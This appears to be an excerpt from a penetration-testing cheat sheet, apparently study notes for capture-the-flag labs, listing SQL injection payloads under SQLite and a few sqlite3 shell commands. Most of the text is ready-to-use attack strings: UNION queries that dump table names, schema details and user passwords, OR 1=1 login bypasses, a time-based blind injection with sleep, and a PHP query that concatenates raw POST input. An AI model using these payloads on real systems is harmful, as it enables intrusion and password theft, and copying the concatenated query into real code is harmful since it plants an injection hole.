
## SQLite

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Database Analysis > Common Injections > SQLite`

```
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```
```
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```
```
<USERNAME>' OR 1=1 -- //
```

Results in:

```
SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
```
```
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
```
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
```
' ORDER BY 1-- //
```
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```
```
' UNION SELECT null, null, database(), user(), @@version  -- //
```
```
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
```
```
' UNION SELECT null, username, password, description, null FROM users -- //
```
```
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```
```
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```
```
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```


## sqlite3

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Database Analysis > sqlite3`

```
sqlite3 <FILE>.db
```
```
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```
